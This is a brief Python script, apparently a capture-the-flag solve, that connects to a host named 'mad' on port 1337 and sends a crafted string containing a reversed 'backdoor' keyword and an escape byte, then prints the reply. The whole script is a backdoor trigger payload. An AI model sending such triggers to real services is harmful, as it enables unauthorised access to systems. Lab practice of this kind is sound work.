import socket

command = f"scroll!!roodkcabur!\n\x1bms".encode()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect(("mad", 1337))
    sock.sendall(command)

    for r in iter(lambda: sock.recv(512), b''):
        print(r.decode(errors="ignore"), end="")
